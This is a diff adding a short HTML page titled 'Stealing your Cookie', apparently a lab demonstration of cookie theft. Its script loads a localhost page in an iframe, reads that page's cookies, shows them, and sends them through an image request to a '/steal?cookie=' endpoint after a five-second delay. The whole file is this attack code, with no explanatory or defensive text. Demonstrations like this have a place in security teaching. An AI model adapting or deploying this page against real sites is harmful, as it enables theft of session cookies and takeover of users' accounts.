@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Stealing your Cookie</title>
+</head>
+
+<body>
+	<h2>Thanks for the cookie! :)</h2>
+	<p></p>
+	<script>
+		document.cookie = ''
+		const iframe = document.createElement('iframe')
+		iframe.src = 'http://localhost:4000/index.html'
+		document.body.appendChild(iframe)
+		console.log(iframe.contentDocument.cookie)
+
+		// wait 5 seconds
+		setTimeout(function() {
+		const p = document.createElement('p')
+		p.innerHTML = iframe.contentDocument.cookie
+		document.body.appendChild(p)
+
+		new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
+		}, 5000);
+	</script>
+</body>
+</html>
